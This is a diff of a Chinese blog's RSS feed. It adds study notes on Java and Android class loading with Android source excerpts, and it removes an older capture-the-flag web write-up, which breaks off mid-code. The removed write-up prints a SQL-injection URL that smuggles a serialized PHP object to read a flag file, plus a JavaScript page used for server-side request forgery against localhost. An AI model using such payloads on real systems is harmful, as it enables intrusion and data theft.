@@ -5,8 +5,279 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Tue, 31 Dec 2019 23:38:58 +0800</lastBuildDate>
+    <lastBuildDate>Fri, 03 Jan 2020 18:26:07 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Java及Android类加载机制学习笔记</title>
+      <link>https://syang-ng.github.io/2020/01/java%E5%8F%8Aandroid%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Fri, 03 Jan 2020 18:26:07 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/01/java%E5%8F%8Aandroid%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
+      <description>
+
+&lt;p&gt;Java 类加载和 Android 上类加载相关的学习笔记，大部分文字来自《深入理解 Java 虚拟机》，部分来自网上博文（我不生产知识，我只是知识的搬运工 XD）&lt;/p&gt;
+
+&lt;h2 id=&#34;java-中的类加载机制&#34;&gt;Java 中的类加载机制&lt;/h2&gt;
+
+&lt;h3 id=&#34;类加载流程&#34;&gt;类加载流程&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;一个类型从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期将会经历加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（Initialization）、使用（Using）和卸载（Unloading）七个阶段，其中验证、准备、解析三个部分统称为连接（Linking）&lt;/p&gt;
+
+&lt;p&gt;在加载阶段，Java虚拟机需要完成以下三件事情&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;通过一个类的全限定名来获取定义此类的二进制字节流。&lt;/li&gt;
+&lt;li&gt;将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。&lt;/li&gt;
+&lt;li&gt;在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;但上述过程仅仅是 Java 虚拟机的规范要求，在真正的实现上给 Java 虚拟机留下了非常大的操作空间，比如&lt;code&gt;通过一个类的全限定名来获取定义此类的二进制字节流&lt;/code&gt;这条规则，并不限定必须从磁盘上读取 class 文件，这极大地激发了开发者的创造性：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;从ZIP压缩包中读取，这很常见，最终成为日后JAR、EAR、WAR格式的基础。&lt;/li&gt;
+&lt;li&gt;从网络中获取，这种场景最典型的应用就是Web Applet。&lt;/li&gt;
+&lt;li&gt;运行时计算生成，这种场景使用得最多的就是动态代理技术，在java.lang.reflect.Proxy中，就是用了ProxyGenerator.generateProxyClass()来为特定接口生成形式为“*$Proxy”的代理类的二进制字节流。&lt;/li&gt;
+&lt;li&gt;由其他文件生成，典型场景是JSP应用，由JSP文件生成对应的Class文件。&lt;/li&gt;
+&lt;li&gt;从数据库中读取，这种场景相对少见些，例如有些中间件服务器（如SAP Netweaver）可以选择把程序安装到数据库中来完成程序代码在集群间的分发。&lt;/li&gt;
+&lt;li&gt;可以从加密文件中获取，这是典型的防Class文件被反编译的保护措施，通过加载时解密Class文件来保障程序运行逻辑不被窥探。&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;java-中的类加载器&#34;&gt;Java 中的类加载器&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;BootStrap ClassLoader，Java 类加载层次中最顶层的类加载器，负责加载 JDK中 的核心类库，负责加载Java的核心类库，如 rt.jar，resources.jar 等，由C++编写。&lt;/li&gt;
+&lt;li&gt;Extension ClassLoader，扩展类加载器，负责加载 Java 的扩展类库，如 $JAVA_HOME/jre/lib/ext/ 目录下的所有 jar。&lt;/li&gt;
+&lt;li&gt;Application ClassLoader，系统类加载器，负责加载应用程序 classpath 目录下的所有 jar 和 class 文件。&lt;/li&gt;
+&lt;li&gt;自定义类加载器，一般继承自 3，实现自定义的类加载器。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;双亲委派机制&#34;&gt;双亲委派机制&lt;/h3&gt;
+
+&lt;p&gt;首先个人认为，将 &lt;code&gt;parents delegate&lt;/code&gt; 翻译为 &lt;code&gt;双亲委派&lt;/code&gt; 并不是特别准确，这个机制指的是，如果一个类加载器收到类加载的请求，它不会主动尝试自己加载类，而是将这个请求委托给父类的加载器完成，如此逐级往上，除非父加载器找不到指定类的时候，子加载器才会自己主动加载。很明显这里并没有 “双亲” 或者说两个父类的加载器的存在，译作 “双亲委派” 失去了翻译中的 “达”。&lt;/p&gt;
+
+&lt;p&gt;这里贴一段 Java Doc 的原文：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;h3 id=&#34;the-java-class-loading-mechanism&#34;&gt;The Java Class Loading Mechanism&lt;/h3&gt;
+
+&lt;p&gt;The Java platform uses a delegation model for loading classes. &lt;strong&gt;The basic idea is that every class loader has a &amp;ldquo;parent&amp;rdquo; class loader.&lt;/strong&gt; When loading a class, a class loader first &amp;ldquo;delegates&amp;rdquo; the search for the class to its parent class loader before attempting to find the class itself.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;意义&#34;&gt;意义&lt;/h3&gt;
+
+&lt;p&gt;需要注意的是，在 Java 中，当且仅当两个实例的类名、包名、以及其加载器都相同时，才会被认为同一种类型，所以当使用不同的类加载器去加载一个对象时，会被判断为不同的类型。&lt;/p&gt;
+
+&lt;p&gt;直接贴 &lt;strong&gt;深入理解 Java 虚拟机&lt;/strong&gt; 一书的原文：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;使用双亲委派模型来组织类加载器之间的关系，一个显而易见的好处就是Java中的类随着它的类加载器一起具备了一种带有优先级的层次关系。例如类java.lang.Object，它存放在rt.jar之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都能够保证是同一个类。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Java及Android类加载机制学习笔记/classloader.png&#34; alt=&#34;ClassLoader&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;android-中的类加载机制&#34;&gt;Android 中的类加载机制&lt;/h2&gt;
+
+&lt;p&gt;与一般的 Java 虚拟机不同，Android 虚拟机加载的是 Dex 文件，所谓 Dalvik 虚拟机和 JVM 的区别以及二者背后的恩怨情仇按过不表，还是来看 Android 中的类加载机制。&lt;/p&gt;
+
+&lt;p&gt;Android 类加载器的基类是 BaseDexClassLoader，其派生出三个子类加载器：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;BaseDexClassLoader&lt;/code&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;PathClassLoader&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;DexClassLoader&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;InMemoryDexClassLoader&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;其中 &lt;code&gt;InMemoryDexClassLoader&lt;/code&gt; 在 Android 8.0 中被引入，在这里暂不讨论，之后开篇新文章继续分析新 ClassLoader 的意义和之前在 Android 加壳中的类似实现。&lt;/p&gt;
+
+&lt;p&gt;下面继续来看 Android 的类加载机制：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PathClassLoader&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;public class PathClassLoader extends BaseDexClassLoader {
+    
+    public PathClassLoader(String dexPath, ClassLoader parent) {
+        super(dexPath, null, null, parent);
+    }
+    
+    public PathClassLoader(String dexPath, String librarySearchPath, ClassLoader parent) {
+        super(dexPath, null, librarySearchPath, parent);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;DexClassLoader&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;public class DexClassLoader extends BaseDexClassLoader {
+   public DexClassLoader(String dexPath, String optimizedDirectory,
+            String librarySearchPath, ClassLoader parent) {
+        super(dexPath, new File(optimizedDirectory), librarySearchPath, parent);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显可以看到二者在本质上是对父类 &lt;code&gt;BaseDexClassLoader&lt;/code&gt; 的继承，差别仅在于调用父类构造方法时传入的参数不同，&lt;code&gt;PathClassLoader&lt;/code&gt; 传入的 &lt;code&gt;optimizedDirectory&lt;/code&gt; 为 null，而 &lt;code&gt;DexClassLoader&lt;/code&gt; 提供了optimizedDirectory（&lt;code&gt;optimizedDirectory&lt;/code&gt; 是优化后的 odex 的存放目录），具体最终还是由父类来实现，继续来看父类的代码（这里基于 &lt;a href=&#34;https://cs.android.com/android/platform/superproject/+/android-6.0.1_r81:libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Android 6.0.1_r81&lt;/a&gt;）：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;BaseDexClassLoader&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;public BaseDexClassLoader(String dexPath, File optimizedDirectory,
+            String libraryPath, ClassLoader parent) {
+        super(parent);
+        this.pathList = new DexPathList(this, dexPath, libraryPath, optimizedDirectory);
+    }
+
+    @Override
+    protected Class&amp;lt;?&amp;gt; findClass(String name) throws ClassNotFoundException {
+        List&amp;lt;Throwable&amp;gt; suppressedExceptions = new ArrayList&amp;lt;Throwable&amp;gt;();
+        Class c = pathList.findClass(name, suppressedExceptions);
+        if (c == null) {
+            ClassNotFoundException cnfe = new ClassNotFoundException(&amp;quot;Didn&#39;t find class \&amp;quot;&amp;quot; + name + &amp;quot;\&amp;quot; on path: &amp;quot; + pathList);
+            for (Throwable t : suppressedExceptions) {
+                cnfe.addSuppressed(t);
+            }
+            throw cnfe;
+        }
+        return c;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到 &lt;code&gt;BaseDexClassLoader&lt;/code&gt; 的作用仅是创建了 &lt;code&gt;DexPathList&lt;/code&gt; 实例，而之后所有的 &lt;code&gt;findClass&lt;/code&gt; 调用都会委托给 &lt;code&gt;DexPathList&lt;/code&gt; 来处理，继续看 &lt;code&gt;DexPathList&lt;/code&gt; 的关键代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;final class DexPathList {
+    public DexPathList(ClassLoader definingContext, String dexPath,
+            String libraryPath, File optimizedDirectory) {
+        // ... 省略
+        // save dexPath for BaseDexClassLoader
+        this.dexElements = makePathElements(splitDexPath(dexPath), optimizedDirectory,
+                                            suppressedExceptions);
+        // ... 省略
+    }
+    private static Element[] makePathElements(List&amp;lt;File&amp;gt; files, File optimizedDirectory,
+                                              List&amp;lt;IOException&amp;gt; suppressedExceptions) {
+        List&amp;lt;Element&amp;gt; elements = new ArrayList&amp;lt;&amp;gt;();
+        for (File file : files) {
+            File zip = null;
+            File dir = new File(&amp;quot;&amp;quot;);
+            DexFile dex = null;
+            String path = file.getPath();
+            String name = file.getName();
+            if (path.contains(zipSeparator)) {
+                String split[] = path.split(zipSeparator, 2);
+                zip = new File(split[0]);
+                dir = new File(split[1]);
+            } else if (file.isDirectory()) {
+                elements.add(new Element(file, true, null, null));
+            } else if (file.isFile()) {
+                if (name.endsWith(DEX_SUFFIX)) {
+                    try {
+                        dex = loadDexFile(file, optimizedDirectory);
+                    } catch (IOException ex) {
+                        System.logE(&amp;quot;Unable to load dex file: &amp;quot; + file, ex);
+                    }
+                } else {
+                    zip = file;
+
+                    try {
+                        dex = loadDexFile(file, optimizedDirectory);
+                    } catch (IOException suppressed) {
+                        suppressedExceptions.add(suppressed);
+                    }
+                }
+            } else {
+                System.logW(&amp;quot;ClassLoader referenced unknown path: &amp;quot; + file);
+            }
+            if ((zip != null) || (dex != null)) {
+                elements.add(new Element(dir, false, zip, dex));
+            }
+        }
+        return elements.toArray(new Element[elements.size()]);
+    }
+    private static DexFile loadDexFile(File file, File optimizedDirectory)
+            throws IOException {
+        if (optimizedDirectory == null) {
+            return new DexFile(file);
+        } else {
+            String optimizedPath = optimizedPathFor(file, optimizedDirectory);
+            return DexFile.loadDex(file.getPath(), optimizedPath, 0);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;到这里就能很明显地看到 &lt;code&gt;optimizedDirectory&lt;/code&gt; 是否为 null 对 loadDexFile 有较大的影响，继续跟进 &lt;code&gt;DexFile&lt;/code&gt; 查看其代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;public final class DexFile {    
+    /**
+     * Opens a DEX file from a given filename. This will usually be a ZIP/JAR
+     * file with a &amp;quot;classes.dex&amp;quot; inside.
+     *
+     * The VM will generate the name of the corresponding file in
+     * /data/dalvik-cache and open it, possibly creating or updating
+     * it first if system permissions allow.  Don&#39;t pass in the name of
+     * a file in /data/dalvik-cache, as the named file is expected to be
+     * in its original (pre-dexopt) state.
+     *
+     * @param fileName
+     *            the filename of the DEX file
+     *
+     * @throws IOException
+     *             if an I/O error occurs, such as the file not being found or
+     *             access rights missing for opening it
+     */
+    public DexFile(String fileName) throws IOException {
+        mCookie = openDexFile(fileName, null, 0);
+        mFileName = fileName;
+        guard.open(&amp;quot;close&amp;quot;);
+    }
+
+    private DexFile(String sourceName, String outputName, int flags) throws IOException {
+        if (outputName != null) {
+            try {
+                String parent = new File(outputName).getParent();
+                if (Libcore.os.getuid() != Libcore.os.stat(parent).st_uid) {
+                    throw new IllegalArgumentException(&amp;quot;Optimized data directory &amp;quot; + parent
+                            + &amp;quot; is not owned by the current user. Shared storage cannot protect&amp;quot;
+                            + &amp;quot; your application from code injection attacks.&amp;quot;);
+                }
+            } catch (ErrnoException ignored) {
+            }
+        }
+
+        mCookie = openDexFile(sourceName, outputName, flags);
+        mFileName = sourceName;
+        guard.open(&amp;quot;close&amp;quot;);
+    }
+    // ... 省略
+    static public DexFile loadDex(String sourcePathName, String outputPathName,
+        int flags) throws IOException {
+        return new DexFile(sourcePathName, outputPathName, flags);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显从注释里可以看到，当 &lt;code&gt;optimizedDirectory&lt;/code&gt; 为 null 的情况下，调用 &lt;code&gt;new DexFile(file)&lt;/code&gt;，odex 只能保存到 &lt;code&gt;/data/dalvik-cache&lt;/code&gt; 目录下，而 &lt;code&gt;DexFile.loadDex(file.getPath(), optimizedPath, 0)&lt;/code&gt; 能将 odex 保存到自定义的目录下。&lt;/p&gt;
+
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+
+&lt;p&gt;在 Android 同样实现了双亲委派机制的类加载器，分别为 &lt;code&gt;PathClassLoader&lt;/code&gt; 和 &lt;code&gt;DexClassLoader&lt;/code&gt; ，均继承自父类 &lt;code&gt;BaseDexClassLoader&lt;/code&gt;，其中 &lt;code&gt;DexClassLoader&lt;/code&gt; 在 Android 插件化、动态代码加载等领域有较大的用途。&lt;/p&gt;
+
+&lt;p&gt;需要看详细调用流程的，可以继续参考该篇文章：&lt;a href=&#34;https://juejin.im/post/5d6a79de5188256c3920b8f7&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;谈谈 Android 中的 PathClassLoader 和 DexClassLoader&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;end&#34;&gt;End&lt;/h2&gt;
+
+&lt;p&gt;上述笔记参考诸多资料，来源较多恕不一一列举，如有使用不当之处，还望不吝指出。&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>写在二十一世纪第二个十年的末尾</title>
@@ -20,7 +291,7 @@
 
 &lt;h2 id=&#34;迷茫未来与懦弱的我&#34;&gt;迷茫未来与懦弱的我&lt;/h2&gt;
 
-&lt;p&gt;用的是 &lt;strong&gt;迷茫管家与懦弱的我&lt;/strong&gt; 的 neta，这大概是第一部可以称得上本命番的作品，不过时隔若干年连作品的梗概都已经忘的一干二净，唯一记得的就是男主说的那句 *stand by me*，第一次觉得某个句子帅气的不行啊以至于深深印在脑海里。&lt;/p&gt;
+&lt;p&gt;用的是 &lt;strong&gt;迷茫管家与懦弱的我&lt;/strong&gt; 的 neta，这大概是第一部可以称得上本命番的作品，不过时隔若干年连作品的梗概都已经忘的一干二净，唯一记得的就是男主说的那句 &lt;strong&gt;stand by me&lt;/strong&gt;，第一次觉得某个句子帅气的不行啊以至于深深印在脑海里。&lt;/p&gt;
 
 &lt;p&gt;“即使是懦弱如我也会努力对你说出 stand by me，同你一起面对眼前的所有困难。” 其实真正记住的大概是这句台词背后所体现的勇气，希望大家都有能帅气地做出决定的一天。&lt;/p&gt;
 
@@ -4104,360 +4375,6 @@ It works !
 &lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/310439&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Prototype pollution attack (Hoek)&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Object - MDN 文档&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/shuiyi/p/5305435.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;三张图搞懂JavaScript的原型对象与原型链&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>网鼎杯-Web-Writeup</title>
-      <link>https://syang-ng.github.io/2018/08/wangding-web-writeup/</link>
-      <pubDate>Mon, 20 Aug 2018 18:35:43 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/08/wangding-web-writeup/</guid>
-      <description>
-
-&lt;h2 id=&#34;fakebook&#34;&gt;fakebook&lt;/h2&gt;
-
-&lt;p&gt;访问 &lt;code&gt;robots.txt&lt;/code&gt; 得到泄露的文件 &lt;code&gt;user.php.bak&lt;/code&gt;：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Disallow: /user.php.bak
-Sitemap: http://domain.com/sitemap.xml
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class UserInfo
-{
-    public $name = &amp;quot;&amp;quot;;
-    public $age = 0;
-    public $blog = &amp;quot;&amp;quot;;
-
-    public function __construct($name, $age, $blog)
-    {
-        $this-&amp;gt;name = $name;
-        $this-&amp;gt;age = (int)$age;
-        $this-&amp;gt;blog = $blog;
-    }
-
-    function get($url)
-    {
-        $ch = curl_init();
-
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $output = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        if($httpCode == 404) {
-            return 404;
-        }
-        curl_close($ch);
-
-        return $output;
-    }
-
-    public function getBlogContents ()
-    {
-        return $this-&amp;gt;get($this-&amp;gt;blog);
-    }
-
-    public function isValidBlog ()
-    {
-        $blog = $this-&amp;gt;blog;
-        return preg_match(&amp;quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&amp;quot;, $blog);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;测试页面功能，可以猜测 &lt;code&gt;view.php?no=xxx&lt;/code&gt; 处存在 sql 注入的问题：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/view1.png&#34; alt=&#34;view 1&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/view2.png&#34; alt=&#34;view 2&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到此时页面会报 unserialize() 的相应错误，那么可以做一个合理的猜测，页面会将从 mysql 中取出的数据，并将数据反序列化后再填充到页面上&lt;/p&gt;
-
-&lt;p&gt;而此时应该会调用 &lt;code&gt;getBlogContents()&lt;/code&gt; 函数，那么这里必然存在一个 SSRF 的问题，我们只要构造 payload 使得其访问 &lt;code&gt;/var/www/html/flag.php&lt;/code&gt; 即可&lt;/p&gt;
-
-&lt;p&gt;那么我们可以尝试构造相应序列化数据作为 payload：&lt;code&gt;O:8:&amp;quot;UserInfo&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:24;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;最后 payload 如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;http://80be5985cb9c4234bd4d0459d6a7f7238f336e1e2c514d60.game.ichunqiu.com/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:24;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27%23
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;查看源代码即可获得 base64 编码后的 flag，解码即可得到 &lt;code&gt;flag{a004021a-5f34-4692-b9b2-f5b50e6c095f}&lt;/code&gt;：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3thMDA0MDIxYS01ZjM0LTQ2OTItYjliMi1mNWI1MGU2YzA5NWZ9IjsNCmV4aXQoMCk7DQo=&#39;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;我们可以通过相同的方式获得 &lt;code&gt;view.php&lt;/code&gt; 的源码来加深我们的理解：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php session_start(); ?&amp;gt;
-&amp;lt;?php require_once &#39;db.php&#39;; ?&amp;gt;
-&amp;lt;?php require_once &#39;user.php&#39;; ?&amp;gt;
-&amp;lt;?php require_once &#39;error.php&#39;; ?&amp;gt;
-&amp;lt;?php
-
-$db = new DB();
-
-?&amp;gt;
-&amp;lt;!doctype html&amp;gt;
-&amp;lt;html lang=&amp;quot;ko&amp;quot;&amp;gt;
-&amp;lt;head&amp;gt;
-    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
-    &amp;lt;meta name=&amp;quot;viewport&amp;quot;
-          content=&amp;quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&amp;quot;&amp;gt;
-    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
-    &amp;lt;title&amp;gt;User&amp;lt;/title&amp;gt;
-
-    &amp;lt;?php require_once &#39;bootstrap.php&#39;; ?&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-&amp;lt;?php
-
-$no = $_GET[&#39;no&#39;];
-if ($db-&amp;gt;anti_sqli($no))
-{
-    die(&amp;quot;no hack ~_~&amp;quot;);
-}
-
-$res = $db-&amp;gt;getUserByNo($no);
-$user = unserialize($res[&#39;data&#39;]);
-//print_r($res);
-
-?&amp;gt;
-&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
-    &amp;lt;table class=&amp;quot;table&amp;quot;&amp;gt;
-        &amp;lt;tr&amp;gt;
-            &amp;lt;th&amp;gt;
-                username
-            &amp;lt;/th&amp;gt;
-            &amp;lt;th&amp;gt;
-                age
-            &amp;lt;/th&amp;gt;
-            &amp;lt;th&amp;gt;
-                blog
-            &amp;lt;/th&amp;gt;
-        &amp;lt;/tr&amp;gt;
-        &amp;lt;tr&amp;gt;
-            &amp;lt;td&amp;gt;
-                &amp;lt;?php echo $res[&#39;username&#39;]; ?&amp;gt;
-            &amp;lt;/td&amp;gt;
-            &amp;lt;td&amp;gt;
-                &amp;lt;?php echo $user-&amp;gt;age; ?&amp;gt;
-            &amp;lt;/td&amp;gt;
-            &amp;lt;td&amp;gt;
-                &amp;lt;?php echo xss($user-&amp;gt;blog); ?&amp;gt;
-            &amp;lt;/td&amp;gt;
-        &amp;lt;/tr&amp;gt;
-    &amp;lt;/table&amp;gt;
-
-    &amp;lt;hr&amp;gt;
-    &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
-    &amp;lt;p&amp;gt;the contents of his/her blog&amp;lt;/p&amp;gt;
-    &amp;lt;hr&amp;gt;
-    &amp;lt;?php
-
-    $response = $user-&amp;gt;getBlogContents();
-    if ($response === 404)
-    {
-        echo &amp;quot;404 Not found&amp;quot;;
-    }
-
-    else
-    {
-        $base64 = base64_encode($response);
-        echo &amp;quot;&amp;lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,{$base64}&#39;&amp;gt;&amp;quot;;
-        // echo $response;
-    }
-
-    // var_dump($user-&amp;gt;getBlogContents());
-    ?&amp;gt;
-
-&amp;lt;/div&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;非常悲伤的在本题陷入误区了，选择了绕过 &lt;code&gt;isValidBlog&lt;/code&gt;，构造 url 使其指向 &lt;code&gt;127.0.0.1&lt;/code&gt; 但最后仍然不能访问到相应文件，想来是禁止了 http 协议的访问（😭&lt;/p&gt;
-
-&lt;h2 id=&#34;spider&#34;&gt;spider&lt;/h2&gt;
-
-&lt;p&gt;首先尝试访问 &lt;code&gt;robots.txt&lt;/code&gt;，发现存在 &lt;code&gt;/get_sourcecode&lt;/code&gt; 页面，但页面提示 &lt;code&gt;NOT 127.0.0.1&lt;/code&gt;，由此可以推测可能需要通过其他方式使得服务器去访问该网址&lt;/p&gt;
-
-&lt;p&gt;那么我们从网址提供的功能入手：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/spider.png&#34; alt=&#34;spider&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;根据提示我们可以知道该网站提供的是动态爬虫的功能，简单说该页面可以抓取动态网页，那么显然我们可以在我们提交的 html 文件中写入 js 代码，js 代码在服务器访问的过程中会被执行：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
-	&amp;lt;body&amp;gt;
-		&amp;lt;a id=&#39;test&#39; href=&amp;quot;&amp;quot;&amp;gt;1&amp;lt;/a&amp;gt;
-		&amp;lt;script src=&amp;quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
-		&amp;lt;script&amp;gt;
-		$.get(&#39;http://127.0.0.1/get_sourcecode&#39;, function(data){
-			document.getElementById(&amp;quot;test&amp;quot;).innerHTML=data;
-		});
-		&amp;lt;/script&amp;gt;
-	&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到服务器访问 &lt;code&gt;get_sourcecode&lt;/code&gt; 并在相应页面上输出内容：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/wangding-web-writeup/sourcecode.png&#34; alt=&#34;source code&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;获得源代码如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
-# -*- encoding: utf-8 -*-
-
-from flask import Flask, request 
-from flask import render_template
-import os
-import uuid
-import tempfile
-import subprocess
-import time
-import json
-
-app = Flask(__name__ , static_url_path=&#39;&#39;)
-
-def proc_shell(cmd):
-    out_temp = tempfile.SpooledTemporaryFile(bufsize=1000*1000)
-    fileno = out_temp.fileno()
-    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=False)
-    start_time = time.time()
-    while True:
-        if proc.poll() == None:
-            if time.time() - start_time &amp;amp;gt; 30:
-                proc.terminate()
-                proc.kill()
-                proc.communicate()
-                out_temp.seek(0)
-                out_temp.close()
-                return
-            else:
-                time.sleep(1)
-        else:
-            proc.communicate()
-            out_temp.seek(0)
-            data = out_temp.read()
-            out_temp.close()
-            return data
-
-def casperjs_html(url):
-    cmd = &#39;casperjs {0} --ignore-ssl-errors=yes --url={1}&#39;.format(os.path.dirname(__file__) + &#39;/casper/casp.js&#39; ,url)
-    cmd = cmd.split(&#39; &#39;)
